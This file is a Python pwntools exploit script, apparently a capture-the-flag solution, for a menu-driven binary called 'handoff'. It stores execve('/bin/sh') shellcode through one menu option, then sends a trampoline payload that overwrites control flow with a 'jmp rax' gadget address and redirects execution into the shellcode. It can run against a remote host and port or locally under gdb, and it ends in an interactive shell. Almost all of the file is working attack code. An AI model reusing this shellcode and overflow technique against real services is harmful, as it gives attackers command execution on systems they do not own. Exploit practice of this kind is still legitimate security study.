from pwn import *
import ctypes, mmap, os

def get_gadget(rop: ROP, instructions: list[str]) -> int:
    try:
        gadget = rop.find_gadget(instructions)
        print(f"Gadget found at {hex(gadget.address)}")
        return gadget.address
    except AttributeError:
        print("Gadget not found :(")
        return None


# =====================
# Custom shellcode (_start shell)
# =====================
shellcode = (
    b"\x48\xbb\x2f\x62\x69\x6e\x2f"  # movabs rbx, '/bin/sh'
    b"\x73\x68\x00"
    b"\x53"                          # push rbx
    b"\x48\x89\xe7"                  # mov rdi, rsp
    b"\x48\x31\xf6"                  # xor rsi, rsi
    b"\x48\x31\xd2"                  # xor rdx, rdx
    b"\xb8\x3b\x00\x00\x00"          # mov eax, 0x3b
    b"\x0f\x05"                      # syscall
)

print(f"length of shellcode: {len(shellcode)}")

# =====================
# Setup
# =====================
binary = './handoff'
context.binary = binary
context.arch = "amd64"
context.timeout = None

elf = ELF(binary, checksec=False)
rop = ROP(elf)

print("Type [y/n]:")
print("y -> server exploitation")
print("n -> local exploitation")
exploit = True if (input(">>>").lower() == 'y') else False

if exploit:
    HOST = input("Enter Hostname: ")
    PORT = int(input("Enter Port no: "))
    io = remote(HOST, PORT)
else:
    # ðŸ”¥ Run under gdb but still controlled by pwntools
    gdbscript = f"""
        break *vuln
        continue
    """
    io = gdb.debug(binary, gdbscript=gdbscript)

# =====================
# Payload preparation
# =====================
asm_code = """
	jmp  skip
	nop
	nop
	nop
	nop
	nop
	nop
	skip:
	sub rax,0x2cc
	jmp rax
"""

trampoline = asm(asm_code)
print(len(trampoline))
print(trampoline)

jmp_rax = 0x000000000040116c
trampoline +=  b"A" * 4 + p64(jmp_rax) 

print(trampoline)

# =====================
# Exploit interaction
# =====================


print(io.recvuntil(b'3. Exit the app'))
io.recvline()
io.sendline(b'1')  # this will go through pwntools, not gdb

print(io.recvline())
io.sendline(b'xploit')

io.recvuntil(b'3. Exit the app')
io.recvline()
io.sendline(b'2')
print(io.recvline())
io.sendline(b'0')
print(io.recvline())
io.sendline(shellcode)

io.recvuntil(b'3. Exit the app')
io.recvline()
io.sendline(b'3')
print(io.recvline())
io.sendline(trampoline)

io.interactive()
